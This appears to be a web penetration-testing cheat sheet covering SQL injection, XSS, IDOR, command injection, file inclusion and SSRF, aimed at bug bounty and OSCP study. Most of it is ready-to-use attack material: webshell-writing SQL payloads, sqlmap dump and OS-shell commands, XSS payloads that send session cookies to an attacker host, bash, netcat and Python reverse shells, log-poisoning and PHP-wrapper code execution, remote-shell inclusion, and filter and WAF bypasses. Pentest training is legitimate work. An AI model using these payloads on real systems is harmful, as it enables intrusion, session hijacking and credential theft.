---
id: "07"
title: "OWASP Top 10 Attack Reference"
tags: ["web"]
noEntry: true
---
# 07 — OWASP Top 10 Attack Reference

> **Description:** Deep attack reference for the 5 most exploitable OWASP Top 10 vulnerabilities — every payload and command you need.
> **Best For:** Web application PT, bug bounty hunting, OSCP web modules, interview preparation.
> **Strength:** Every section has payloads, tools, detection methods, and bypass techniques — zero filler.

---

## Decision Tree: Web Injection Point → What First?

> A parameter reflects or errors on your input: you have a confirmed injection point, a vulnerable parameter. Identify the class, then jump to the working exploitation.

```
A confirmed web injection point, a vulnerable parameter →

  STEP 1: SQL Injection (SQLi) (errors or boolean/time differences? dump the database)
      ↓
  STEP 2: Cross-Site Scripting (XSS) (input reflected into the page? steal sessions)
      ↓
  STEP 3: Command Injection (shell metacharacters change the response? get RCE)
      ↓
  STEP 4: File Inclusion (LFI / RFI) (a file or path parameter? read files, then RCE)
      ↓
  STEP 5: Server-Side Request Forgery (SSRF) (a URL parameter? reach the metadata service)
```

---

## Section A — SQL Injection (SQLi)

**How it works:** SQL injection occurs when user-supplied input is concatenated directly into SQL queries without parameterization or proper sanitization. The database interprets attacker-controlled input as SQL syntax rather than data. Because the query is constructed at runtime using string concatenation (`"SELECT * FROM users WHERE id = " + user_input`), injecting SQL metacharacters such as single quotes, comments, and operators causes the database to alter its execution logic. The attacker can manipulate query logic, extract arbitrary data from any table the database user can access, write files to disk, or execute OS commands depending on the database type and configuration.

---

### Detection — Manual Payloads

Inject these one at a time into any user-controlled parameter (GET, POST, Cookie, Header). An error, changed response, or behavioral difference confirms injection.

```sql
'
''
`
,
"
\
')
'))
-- -
#
/*
/*!
' OR '1'='1
' OR 1=1--
' OR 1=1#
" OR 1=1--
' OR 'a'='a
1' ORDER BY 1--
1' ORDER BY 10--         (keep increasing until error → column count = last success)
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1 AND 1=1
1 AND 1=2            (different response from above = Boolean injection confirmed)
1' AND SLEEP(5)--    (time delay = blind injection confirmed)
```

**Error signatures by DBMS:**

| DBMS | Signature |
| --- | --- |
| MySQL | `You have an error in your SQL syntax` |
| MySQL | `Warning: mysql_fetch` |
| MSSQL | `Unclosed quotation mark after the character string` |
| MSSQL | `Incorrect syntax near` |
| Oracle | `ORA-01756: quoted string not properly terminated` |
| PostgreSQL | `ERROR: unterminated quoted string` |
| SQLite | `SQLite3::query(): near` |
| Generic | `SQL syntax error`, `unexpected end of SQL command` |

---

### Exploitation

#### Union-Based (Requires visible output in response)

```sql
-- Step 1: Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 5--    (error at 5 = 4 columns)

-- Step 2: Find visible columns
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT 'a','b','c','d'--

-- Step 3: Extract data
' UNION SELECT username,password,NULL,NULL FROM users--
' UNION SELECT user(),database(),version(),NULL--
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- File read (MySQL, requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL--

-- Write webshell
' UNION SELECT "<?php system($_GET['c']); ?>",NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
```

#### Error-Based (No visible output needed — data in error message)

```sql
-- MySQL updatexml()
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--

-- MySQL extractvalue()
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--
```

#### Boolean Blind

```sql
-- Confirm: true vs false responses differ
' AND 1=1--    (normal page)
' AND 1=2--    (different page = blind confirmed)

-- Extract data character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

#### Time-Based Blind

```sql
-- MySQL
' AND SLEEP(5)--
1; SELECT SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
1; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL--
```

---

### sqlmap Full Command Reference

```bash
# GET parameter
sqlmap -u "http://<TARGET>/page.php?id=1" --batch

# POST parameter
sqlmap -u "http://<TARGET>/login.php" --data="user=admin&pass=test" --batch

# Cookie injection
sqlmap -u "http://<TARGET>/profile" --cookie="id=1; session=abc" -p id --batch

# Header injection (User-Agent, Referer, X-Forwarded-For)
sqlmap -u "http://<TARGET>/" -H "User-Agent: *" --level=3 --batch
sqlmap -u "http://<TARGET>/" -H "X-Forwarded-For: *" --batch

# From Burp Suite saved request (mark injection point with *)
sqlmap -r request.txt --batch

# Enumerate databases → tables → dump
sqlmap -u "http://<TARGET>/page.php?id=1" --batch --dbs
sqlmap -u "http://<TARGET>/page.php?id=1" --batch -D <DB> --tables
sqlmap -u "http://<TARGET>/page.php?id=1" --batch -D <DB> -T users --columns
sqlmap -u "http://<TARGET>/page.php?id=1" --batch -D <DB> -T users -C username,password --dump

# Dump everything
sqlmap -u "http://<TARGET>/page.php?id=1" --batch --dump-all

# Get OS shell
sqlmap -u "http://<TARGET>/page.php?id=1" --os-shell --batch

# Read file
sqlmap -u "http://<TARGET>/page.php?id=1" --file-read=/etc/passwd --batch

# Write webshell
sqlmap -u "http://<TARGET>/page.php?id=1" \
  --file-write=/kali/shell.php \
  --file-dest=/var/www/html/shell.php --batch

# Specify DBMS (saves time)
sqlmap -u "http://<TARGET>/page.php?id=1" --dbms=mysql --batch

# Increase aggression
sqlmap -u "http://<TARGET>/page.php?id=1" --level=5 --risk=3 --batch

# Bypass WAF — tamper scripts
sqlmap -u "http://<TARGET>/page.php?id=1" --tamper=space2comment --batch
sqlmap -u "http://<TARGET>/page.php?id=1" --tamper=between,randomcase,space2comment --batch
```

---

### WAF Bypass Techniques

```sql
-- Case variation
SeLeCt UsEr()
UNION/**/SELECT

-- Comments as whitespace
UNION/**/SELECT/**/NULL

-- URL encoding
UNION%20SELECT%20NULL
%55NION%20%53ELECT

-- Double URL encoding
%2555NION %2553ELECT

-- Inline comments
UN/**/ION SE/**/LECT

-- Keyword splitting (MySQL specific)
UNIO/**/N SELECT

-- Whitespace alternatives
UNION%09SELECT%09NULL       (tab)
UNION%0ASELECT%0ANULL       (newline)
UNION%0DSELECT%0DNULL       (carriage return)

-- Scientific notation for numbers (MySQL)
1e0 UNION SELECT NULL-- (1e0 = 1)

-- Hex encoding strings
' UNION SELECT 0x61646d696e--    (0x61646d696e = 'admin')
```

**Remediation:** Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.

---

## Section B — Cross-Site Scripting (XSS)

**How it works:** XSS occurs when a web application includes untrusted user data in a web page without proper escaping. The browser interprets the injected content as legitimate script and executes it in the victim's browser context. Unlike SQLi, XSS attacks the user rather than the server — it can steal session tokens, perform actions as the victim, redirect to phishing pages, or log keystrokes.

### Type Identification

| Type | Characteristic | Test |
| --- | --- | --- |
| **Reflected** | Payload executes in response to current request | Payload in URL/form, see it echo back in response |
| **Stored** | Payload saved server-side, executes for every viewer | Submit in comment/profile, log out, revisit as another user |
| **DOM-Based** | JS reads attacker data and writes to DOM unsafely | Source shows `document.write`, `innerHTML`, `eval`, `location.hash` |

---

### Payload List (15+)

```javascript
// Basic confirmation payloads
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>

// Attribute injection (inside tag attribute value)
" onmouseover="alert(1)
' onmouseover='alert(1)
"><script>alert(1)</script>
" autofocus onfocus="alert(1)

// Filter bypass — event handlers
<input autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

// Filter bypass — no script tag
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

// Filter bypass — case insensitive
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

// Filter bypass — href
<a href="javascript:alert(1)">XSS</a>
<a href="JaVaScRiPt:alert(1)">XSS</a>

// Filter bypass — data URI
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">

// SVG-specific
<svg><script>alert(1)</script></svg>
<svg><animatetransform onbegin=alert(1)>

// Template literal bypass
<script>alert`1`</script>

// Polyglot (one payload that fires across many injection contexts)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// DOM-based test
#"><script>alert(1)</script>
javascript:alert(1)
```

---

### Cookie Stealing Payload

```html
<!-- Attacker: start listener · python3 -m http.server 80 or nc -lvnp 80 -->

<!-- Payload 1: Redirect -->
<script>document.location='http://<YOUR-IP>/?c='+document.cookie;</script>

<!-- Payload 2: Fetch (quieter, no redirect) -->
<script>fetch('http://<YOUR-IP>/?c='+btoa(document.cookie));</script>

<!-- Payload 3: Image tag (when script blocked) -->
<img src="x" onerror="this.src='http://<YOUR-IP>/?c='+document.cookie">

<!-- Payload 4: XHR -->
<script>
var x=new XMLHttpRequest();
x.open('GET','http://<YOUR-IP>/?c='+document.cookie,true);
x.send();
</script>
```

After receiving the cookie: paste into browser DevTools → Application → Cookies → replace session value → reload.

---

### Where to Look

| Location | Type Risk | Notes |
| --- | --- | --- |
| Search boxes | Reflected | Test immediately — often no filtering |
| URL parameters (`?q=`, `?search=`) | Reflected | Check if value echoes in response |
| Profile/bio fields | Stored | View by other users — high impact |
| Comment sections | Stored | Classic stored XSS target |
| Error messages | Reflected | Username/email in "invalid input" messages |
| HTTP headers (User-Agent, Referer) | Stored | If logged to admin dashboard |
| File upload names | Stored | Filename reflected in response |

---

### Tools

```bash
# XSStrike — automated XSS scanner with WAF bypass
python3 xsstrike.py -u "http://<TARGET>/search?q=test"
python3 xsstrike.py -u "http://<TARGET>/search?q=test" --crawl    # Crawl entire site
python3 xsstrike.py -u "http://<TARGET>/login" --data "user=test&pass=test"

# Burp Suite — manual testing
# Intruder → Sniper → payload = XSS list
# Active Scanner (Pro) → auto-detects XSS
# DOM Invader (Burp browser extension) → finds DOM-based XSS
```

---

## Section C — Broken Access Control / IDOR

**How it works:** Broken Access Control encompasses any case where an application fails to enforce authorization checks, allowing users to access resources or perform actions beyond their intended permissions. IDOR (Insecure Direct Object Reference) is the most common subtype: the application uses user-controllable input (like an ID number) to directly reference a database record or file without checking whether the requesting user is authorized to access that specific object.

---

### Detection Methodology

**Horizontal privilege escalation:** Access another user's data at the same privilege level.
**Vertical privilege escalation:** Access functionality reserved for higher privilege roles.

```bash
# Step 1: Log in as a normal user, capture all requests in Burp

# Step 2: Identify direct references to objects
# - Numeric IDs in URLs: /user/1337, /order/42, /invoice/9
# - UUIDs: /file/a8f3b2c1-...
# - Usernames: /profile/john
# - Filenames: /download?file=report_john.pdf

# Step 3: Modify and replay in Burp Repeater
# Change ID to another user's: /user/1337 → /user/1
# Change UUID: /file/your-uuid → /file/someone-elses-uuid

# Step 4: Test with multiple accounts if possible
# Log in as User A and User B simultaneously in different browsers
# Capture User A's IDs → replay as User B
```

---

### Burp Suite Testing Workflow

```bash
# Intruder — enumerate IDs
# 1. Capture request: GET /api/user/1337
# 2. Send to Intruder → mark §1337§ as payload position
# 3. Payload type: Numbers → Sequential 1 to 1000
# 4. Filter responses by length or status code
# 5. 200 OK with different content = IDOR confirmed

# Repeater — manual testing
# 1. Capture any request referencing an ID
# 2. Send to Repeater
# 3. Change ID to different values: 0, 1, 2, -1, 9999
# 4. Change role parameter: role=user → role=admin
# 5. Change ownership param: user_id=5 → user_id=1 (admin)
```

---

### Real Examples

```
# API endpoint manipulation
GET /api/user/1337          → try /api/user/1  (admin)
GET /api/user/1337          → try /api/user/0
GET /api/orders/9812        → try /api/orders/1
DELETE /api/post/456        → can you delete another user's post?

# File download parameters
GET /download?file=user_1337_invoice.pdf
→ Try: /download?file=user_1_invoice.pdf
→ Try: /download?file=../../../etc/passwd (LFI via IDOR)

# UUID manipulation (UUIDs are guessable if sequential or weak)
GET /profile/a8f3b2c1-4d5e-6f7a-8b9c-0d1e2f3a4b5c
→ Try patterns from known UUIDs

# Role parameter in POST body
POST /api/update-profile
{"user_id": 5, "role": "user", "email": "test@test.com"}
→ Try: {"user_id": 5, "role": "admin", "email": "test@test.com"}

# Admin functions in request body
POST /api/admin/delete-user
{"target_id": 1}
→ Try sending as a normal user (missing auth check on server)
```

---

### Common IDOR Locations

| Location | What to Modify |
| --- | --- |
| REST API endpoints | Numeric ID in URL path |
| File download parameters | Filename or ID in query string |
| Profile/account pages | `user_id` or `account` in request |
| Order/invoice history | Order ID in URL or body |
| Admin functions | Remove/change role parameter |
| Password reset tokens | Sequential or guessable tokens |
| Export/report generation | Reference IDs in request body |

---

## Section D — Command Injection

**How it works:** Command injection occurs when user-supplied data is passed to a system shell (via functions like `system()`, `exec()`, `popen()` in PHP; `subprocess`, `os.system()` in Python; `Runtime.exec()` in Java) without sufficient sanitization. The attacker injects shell metacharacters that cause the shell to execute additional commands beyond the developer's intent. The injected commands run with the same privileges as the web server process.

---

### Detection Payloads

Append these to any input that might be passed to a system command (IP addresses, hostnames, filenames, usernames, port numbers):

```bash
;id
|id
||id
&&id
`id`
$(id)
%0aid             # URL-encoded newline
%0a id
;whoami
|whoami
;sleep 5          # Time-based — if response delays by 5s, injection confirmed
|sleep 5
&&sleep 5
$(sleep 5)
`sleep 5`
;ping -c 1 <YOUR-IP>
```

---

### Blind Command Injection Detection

**Time-based:**
```bash
;sleep 5
|sleep 5;
$(sleep 5)
`sleep 5`
& ping -c 1 -W 5 <UNREACHABLE-IP> &     # Timeout = ~5s
; timeout 5
```

**Out-of-band (DNS/HTTP callback):**
```bash
# Start listener: tcpdump -i tun0 icmp
;ping -c 3 <YOUR-IP>

# HTTP callback — start python3 -m http.server 80 on attacker
;curl http://<YOUR-IP>/blind-test
;wget http://<YOUR-IP>/blind-test
$(curl http://<YOUR-IP>/blind-test)

# DNS — if you have Burp Collaborator or interactsh
;nslookup <YOUR-BURP-COLLABORATOR-DOMAIN>
```

---

### Reverse Shell via Command Injection

```bash
# Replace injection point with these (URL-encode when in HTTP params)
;bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-IP> 4444 >/tmp/f
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR-IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
;nc <YOUR-IP> 4444 -e /bin/bash
```

---

### Filter Bypass Techniques

```bash
# Whitespace bypass
{cat,/etc/passwd}         # Brace expansion (no spaces needed)
cat${IFS}/etc/passwd      # ${IFS} = Internal Field Separator (space)
cat$IFS/etc/passwd
cat</etc/passwd           # Input redirection
X=$'cat\x20/etc/passwd';$X   # Hex-encoded space

# Keyword bypass — string concatenation
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
who$@ami

# Encoding bypass
;$(echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d)    # base64 of "cat /etc/passwd"
;$(echo 63617420 2f6574632f706173737764 | xxd -r -p)    # Hex encoded

# Variable-based bypass
a=c;b=at;$a$b /etc/passwd
IFS=,; cmd=cat,/etc/passwd; $cmd

# Newline injection (when semicolons and pipes are filtered)
%0a id
%0d%0a id
```

---

## Section E — File Inclusion (LFI / RFI)

**How it works:** File inclusion vulnerabilities occur when an application dynamically includes files based on user-supplied input without proper validation. In PHP, functions like `include()`, `require()`, `include_once()`, and `require_once()` are commonly vulnerable. LFI (Local File Inclusion) allows reading local server files. RFI (Remote File Inclusion) allows including and executing code from a remote URL (requires `allow_url_include=On`). Both can lead to full RCE through various techniques.

---

### LFI Payload List

```bash
# Basic path traversal
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Absolute path (when relative doesn't work)
/etc/passwd

# Filter bypass — nested traversal (filter removes ../ but doesn't loop)
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Double URL encoding
%252e%252e%252fetc%252fpasswd
..%252f..%252fetc%252fpasswd

# Null byte — PHP < 5.3.4 (appended extension gets cut)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd\0

# UTF-8 encoding
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Windows path traversal
..\..\..\..\Windows\win.ini
..\..\..\Windows\win.ini
..\\..\\..\Windows\win.ini
```

---

### Interesting Linux Files

```bash
/etc/passwd                          # User accounts — always try first
/etc/shadow                          # Hashed passwords (requires root)
/etc/group                           # Group memberships
/etc/hostname                        # Hostname
/etc/hosts                           # Local DNS entries
/proc/self/environ                   # Environment variables — often has HTTP_USER_AGENT
/proc/self/cmdline                   # Current process command line
/proc/net/tcp                        # Open TCP connections
/proc/self/status                    # Process info including UID
/var/log/apache2/access.log          # Apache access log — log poisoning
/var/log/apache2/error.log           # Apache error log
/var/log/nginx/access.log            # Nginx access log
/var/log/auth.log                    # SSH and auth events
/var/mail/www-data                   # Web server mail
/home/<USER>/.bash_history           # Shell history
/home/<USER>/.ssh/id_rsa             # SSH private key
/home/<USER>/.ssh/authorized_keys    # Authorized SSH public keys
/var/www/html/wp-config.php          # WordPress credentials
/var/www/html/config.php             # Web app credentials
/var/www/html/.env                   # Laravel / modern PHP creds
/etc/apache2/apache2.conf            # Apache config
/etc/nginx/nginx.conf                # Nginx config
/etc/mysql/my.cnf                    # MySQL config
/etc/php/php.ini                     # PHP config
/proc/self/fd/1                      # Standard output
/proc/self/fd/2                      # Standard error
```

---

### Interesting Windows Files

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\Windows\repair\SAM
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SYSTEM
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\global.asax
C:\xampp\apache\conf\httpd.conf
C:\xampp\passwords.txt
C:\wamp\passwords.txt
C:\Users\Administrator\Desktop\proof.txt
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

### Log Poisoning → RCE

**Works when:** You can confirm LFI reads an Apache/Nginx access log AND the server executes PHP.

```bash
# Step 1: Confirm you can read the access log
?page=/var/log/apache2/access.log
# You should see: IP - - [date] "GET / HTTP/1.1" 200 ...

# Step 2: Inject PHP code into the log via User-Agent header
curl -s http://<TARGET>/ -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
# Or via Burp Repeater: modify User-Agent field

# Step 3: Trigger execution via LFI
?page=/var/log/apache2/access.log&cmd=id
?page=/var/log/apache2/access.log&cmd=whoami
?page=/var/log/apache2/access.log&cmd=cat+/etc/passwd

# Step 4: Get reverse shell
# URL-encoded bash reverse shell:
?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR-IP>/4444+0>%261'

# Alternative log files for poisoning:
# /var/log/nginx/access.log
# /var/log/auth.log → inject PHP via SSH username: ssh '<?php system($_GET["cmd"]); ?>'@<TARGET>
# /proc/self/environ → inject via User-Agent, trigger with ?page=/proc/self/environ&cmd=id
```

---

### PHP Wrappers

```bash
# php://filter — read any PHP file's source code (base64 encoded)
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
# Decode the output: echo "BASE64..." | base64 -d

# Read without encoding (if not PHP that would execute)
?page=php://filter/resource=/etc/passwd

# php://input — POST body executed as PHP
# In Burp: change method to POST, set body to PHP code
# URL: ?page=php://input
# Body: <?php system('id'); ?>
# Body: <?php system($_GET['cmd']); ?>

# data:// — inline PHP execution
?page=data://text/plain,<?php system('id')?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
# Decode check: echo "PD9waHAgc3lzdGVtKCdpZCcpOz8+" | base64 -d
# = <?php system('id');?>

# expect:// — direct command (only if expect extension loaded)
?page=expect://id
?page=expect://whoami

# zip:// — execute code from a zip file
# Create zip with PHP file inside:
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
zip shell.zip shell.php
# Upload zip via file upload
?page=zip:///var/www/html/uploads/shell.zip%23shell&cmd=id

# phar:// — similar to zip
?page=phar:///path/to/file.phar/shell.php
```

---

### RFI Exploitation

```bash
# Check if RFI is enabled (php.ini must have allow_url_include = On)
# Much rarer in modern PHP (disabled by default)

# Step 1: Create remote PHP file on your server
echo '<?php system($_GET["cmd"]); ?>' > /tmp/rfi_shell.php
cd /tmp && python3 -m http.server 8080

# Step 2: Trigger RFI
?page=http://<YOUR-IP>:8080/rfi_shell.php
?page=http://<YOUR-IP>:8080/rfi_shell.php&cmd=id

# Step 3: Get reverse shell
?page=http://<YOUR-IP>:8080/rfi_shell.php&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR-IP>/4444+0>%261'

# SMB RFI (Windows targets — try when HTTP doesn't work)
# Start: impacket-smbserver share /tmp/share -smb2support
?page=\\<YOUR-IP>\share\shell.php

# Null byte bypass for RFI
?page=http://<YOUR-IP>/shell.php%00
```

---

## Section F — Server-Side Request Forgery (SSRF)

**How it works:** SSRF occurs when an application fetches a remote resource from a user-controlled URL without validating the destination. The server makes the request on the attacker's behalf, so it reaches hosts the attacker cannot reach directly: loopback services, internal-only APIs, and the cloud metadata endpoint. The highest-value target is `http://169.254.169.254/`, the link-local metadata service on AWS, Azure, and GCP, which hands temporary IAM credentials to anything that asks from inside the instance. SSRF also enables internal port scanning (a quick connection versus a hanging timeout reveals which ports are open) and local file reads through the `file://` scheme.

---

### Detection — URL-Fetching Parameters

Any parameter that takes a URL, host, or path the server will retrieve:

```bash
?url=http://example.com
?path=http://example.com
?img=http://example.com
?src=http://example.com
?load=http://example.com
```

### Internal Service Discovery

```bash
?url=http://127.0.0.1
?url=http://localhost
?url=http://192.168.1.1
?url=http://169.254.169.254/latest/meta-data/   # AWS metadata
```

### Port Scan the Internal Network

```bash
?url=http://127.0.0.1:22    # Connection vs timeout indicates port state
```

### File Read via file:// Scheme

```bash
?url=file:///etc/passwd
```

**See also:** the [Cloud domain](/library/cloud) for turning stolen metadata credentials into live cloud access, and Section E (File Inclusion) for `file://` and PHP-wrapper reads.

**Remediation:** Allowlist outbound destinations and reject internal and link-local ranges (127.0.0.0/8, 169.254.0.0/16, and the RFC-1918 space); disable unused URL schemes such as `file://` and `gopher://`; require token-based metadata (IMDSv2) on AWS.

